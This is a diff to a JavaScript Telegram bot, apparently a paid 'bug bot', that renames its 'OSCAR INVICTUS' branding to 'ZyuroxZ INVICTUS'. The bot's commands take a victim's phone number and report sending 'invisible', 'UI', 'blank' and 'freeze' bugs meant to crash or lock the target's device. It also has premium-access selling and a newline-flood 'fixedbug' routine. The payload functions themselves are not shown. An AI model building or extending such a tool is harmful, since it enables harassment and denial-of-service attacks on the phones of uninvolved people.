-<b>▢ /oscarvisible ☇ ɴᴜᴍʙᴇʀ</b>
+<b>▢ /ZyuroxZvisible ☇ ɴᴜᴍʙᴇʀ</b>
 <b>╰➤ Invisible hard</b>
 
-<b>▢ /oscarui ☇ ɴᴜᴍʙᴇʀ</b>
+<b>▢ /ZyuroxZui ☇ ɴᴜᴍʙᴇʀ</b>
 <b>╰➤ Ui system + invis</b>
 
-<b>▢ /oscarblank ☇ ɴᴜᴍʙᴇʀ</b>
+<b>▢ /ZyuroxZblank ☇ ɴᴜᴍʙᴇʀ</b>
 <b>╰➤ blank all device</b>
 
-<b>▢ /oscarfreeze ☇ ɴᴜᴍʙᴇʀ</b>
+<b>▢ /ZyuroxZfreeze ☇ ɴᴜᴍʙᴇʀ</b>
 <b>╰➤ Freeze nyetuk</b>
 
 <b>▢ /fixedbug ☇ ɴᴜᴍʙᴇʀ</b>
@@ -905,7 +812,7 @@ bot.on("callback_query", (callbackQuery) => {
 </blockquote>`;
     newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
   } else if (data === "ownermenu") {
-    newCaption = `<blockquote><b>( ! ) - OSCAR INVICTUS Akses</b>
+    newCaption = `<blockquote><b>( ! ) - ZyuroxZ INVICTUS Akses</b>
 </blockquote>
 <b>▢ /addprem id ☇ days</b>
 <b>╰➤ Menambahkan akses pada user</b>
@@ -939,14 +846,14 @@ bot.on("callback_query", (callbackQuery) => {
 <b>▢ Frmnz.js ( My support )</b>
 <b>▢ Zepyrine ( My support )</b>
 <b>▢ Erlangga ( Dev Sasukeh )</b>
-<b>▢ AzzCrow ( Dev Crow )</b>
-<b>▢ ALL PT/BUYERR OSCAR INVICTUS</b>
+<b>▢ ZyuroxZCrow ( Dev Crow )</b>
+<b>▢ ALL PT/BUYERR ZyuroxZ INVICTUS</b>
 
-<b>thanks OSCAR INVICTUS</b>
+<b>thanks ZyuroxZ INVICTUS</b>
 </blockquote>`;
     newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
   } else if (data === "mainmenu") {
-    newCaption = `<blockquote>交 OSCAR INVICTUS ᝄ</blockquote>
+    newCaption = `<blockquote>交 ZyuroxZ INVICTUS ᝄ</blockquote>
 ( 👀 ) Holaa ☇ . use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
 <blockquote># 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭</blockquote>
 ⬡ Author : @VallOffcial
@@ -955,14 +862,14 @@ bot.on("callback_query", (callbackQuery) => {
 ⬡ Library : Javascript
 ⬡ Runtime : ${runtime}
 ⬡ Date now : ${date}
-<blockquote>© OSCAR INVICTUS ᝄ</blockquote>
+<blockquote>© ZyuroxZ INVICTUS ᝄ</blockquote>
 `;
     newButtons = [
-        [{ text: "OSCAR BUG", callback_data: "bugmenu" }, 
+        [{ text: "ZyuroxZ BUG", callback_data: "bugmenu" }, 
         { text: "THANKS TO", callback_data: "thanksto" }],
         [{ text: "OWNER MENU", callback_data: "ownermenu" }],
-        [{ text: "DEV OSCAR", url: "https://t.me/VallOffcial" }, 
-        { text: "INFORMASI", url: "https://t.me/OscarInvictus" }]
+        [{ text: "DEV ZyuroxZ", url: "https://t.me/VallOffcial" }, 
+        { text: "INFORMASI", url: "https://t.me/ZyuroxZInvictus" }]
     ];
   }
 
@@ -986,7 +893,7 @@ bot.on("callback_query", (callbackQuery) => {
 
 
 //=======CASE BUG=========//
-bot.onText(/\/oscarvisible (\d+)/, async (msg, match) => {
+bot.onText(/\/ZyuroxZvisible (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -1024,7 +931,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
       caption: `
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ I N V I S ☇  B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
@@ -1049,7 +956,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ I N V I S ☇  B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
@@ -1068,7 +975,7 @@ if (remainingTime > 0) {
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ D E L A Y ☇  B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
@@ -1088,7 +995,7 @@ if (remainingTime > 0) {
   }
 });
 
-bot.onText(/\/oscarui (\d+)/, async (msg, match) => {
+bot.onText(/\/ZyuroxZui (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -1126,7 +1033,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
       caption: `
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤  U I - B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
@@ -1151,7 +1058,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ U I - B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
@@ -1168,7 +1075,7 @@ if (remainingTime > 0) {
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ U I- B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
@@ -1226,7 +1133,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
       caption: `
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ B L A N K - B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
@@ -1251,7 +1158,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ B L A N K - B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
@@ -1268,7 +1175,7 @@ if (remainingTime > 0) {
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ B L A N K - B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
@@ -1288,7 +1195,7 @@ if (remainingTime > 0) {
   }
 });
 
-bot.onText(/\/oscarfreeze (\d+)/, async (msg, match) => {
+bot.onText(/\/ZyuroxZfreeze (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -1326,7 +1233,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
       caption: `
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤F R E E Z - B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
@@ -1351,7 +1258,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ F R E E Z - B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
@@ -1368,7 +1275,7 @@ if (remainingTime > 0) {
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-#- OSCAR INVICTUS
+#- ZyuroxZ INVICTUS
 ╰➤ F R E E Z - B U G
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
  ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
@@ -1411,11 +1318,11 @@ bot.onText(/\/fixedbug\s+(.+)/, async (msg, match) => {
     
     try {
         for (let i = 0; i < 3; i++) {
-            await sock.sendMessage(target, { 
+            await bot.sendMessage(target, { 
                 text: "CROW CLEAR BUG \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCROW CLEAR BUG"
             });
         }
-        bot.sendMessage(chatId, "Done Clear Bug By Azz!!!");
+        bot.sendMessage(chatId, "Done Clear Bug By ZyuroxZ!!!");
     } catch (err) {
         console.error("Error:", err);
         bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
